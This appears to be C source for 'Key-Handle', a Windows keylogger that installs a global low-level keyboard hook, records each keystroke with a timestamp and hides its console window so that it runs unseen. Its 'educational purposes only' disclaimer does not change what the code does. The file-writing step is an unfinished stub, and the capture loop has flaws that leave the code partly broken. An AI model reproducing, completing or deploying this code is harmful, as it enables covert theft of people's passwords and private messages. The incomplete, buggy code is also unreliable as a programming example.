#include <Windows.h>
#include <inttypes.h>
#include <stdio.h>
#include <time.h>

#ifndef _BOOL_DEF_
    #define _BOOL_DEF_
    typedef int bool;
    #define false 0
    #define true 1
#endif

/* prototypes */
void renderMenu(); 
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
/* most people can't write over 1500 characters a minute */
#define MESSAGE_BUFFER_SIZE 1500
HHOOK keyboardHook;
uint_fast16_t messageCount = 1;
uint_fast16_t keyCount = 0;

struct Message {
    char message[MESSAGE_BUFFER_SIZE];
    time_t messageTime;
    struct tm* timeinfo;
};

struct Message messages[MESSAGE_BUFFER_SIZE];

/* The hook procedure */
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {

    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    DWORD lastKeyPressed = key->vkCode;

    /* Intercepting the input msg */
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
        
        static bool updateTime = true;
        fflush(stdout);

        if(updateTime) {
            time(&messages[messageCount].messageTime);
            messages[messageCount].timeinfo = localtime(&messages[messageCount].messageTime);

            printf("\n\n<%02d:%02d> = ",
                   messages[messageCount].timeinfo->tm_hour,
                   messages[messageCount].timeinfo->tm_min);
            updateTime = false;
        }

        messages[messageCount].message[keyCount] = (char)lastKeyPressed;
        printf("%c", messages[messageCount].message[keyCount]);
        
        
        time_t timeOfKey = time(&timeOfKey);
        struct tm* timeOfKeyInfo = localtime(&timeOfKey);

        if(timeOfKeyInfo->tm_min != messages[messageCount].timeinfo->tm_min) {
            puts("THE TIME JUST CHANGED\n");
            messageCount++;
            updateTime = true;
        }
        keyCount++;
        
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

void clear() {
    system("cls");
}

void handleDirectory() {
    clear();
    puts("\nThis is still under construction...\n\nPress enter to return to the menu.");
    getchar();
    renderMenu();
}

void renderMenu() { 
    printf("\n[ Key-Handle ] - By alta\n\n"
        "Please read the following carefully...\n\n"
        "-------------------------------------------------------------------------------------\n"
        "Key-Handle is a simple key capturing program that runs hidden in the background\n"
        "and writes the keystrokes to a textfile in the directory the program was ran from.\n\n"
        "### DISCLAIMER: alta is not responsible for any malicious use of this software, ###\n"
        "###             it was made for educational purposes only.                      ###\n"
        "-------------------------------------------------------------------------------------\n\n"
        "Once capturing begins:\n"
        "You will hear 3 beeps, this console will be hidden and will capture all key strokes \n"
        "in the background. When you're done capturing, press the F9 key, you will hear a \n"
        "final beep to confirm everything closed successfully and the program will create \n"
        "a log.txt file summarising the monitoring session.\n\n"
        "Press enter to start capturing...%c", ' ');
    getchar();

}

int main(int argc, char* argv[]) {
    HWND window;
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);

    bool showMenu = true;
    
        /* Initialising the HHOOK */
    if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
		MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
	} else {
        puts("Hook Successful!\n");
    }

    while(1) {
        if(showMenu) { 
            renderMenu(); 
            for(size_t i = 0; i < 3; i++) {
                MessageBeep(0xFFFFFF);
                Sleep(500);
            }
            ShowWindow(window,0);
            showMenu = false;
        }


        /* capture code */
        

        /* If the terminate key (F9) is pressed. */
        if (GetAsyncKeyState(VK_F9) & 0x8000) {
            /* Write to file */
            // ...

            MessageBeep(0xFFFFFF);
            ShowWindow(window, 1);
            puts("\n\n\n\n\n\n\n\nProgram has terminated, please check the log.txt file.\n"
                 "Press enter to close this terminal...@");
            getchar();
            break;
        }
    } /* End of main program loop */
    return EXIT_SUCCESS;
}
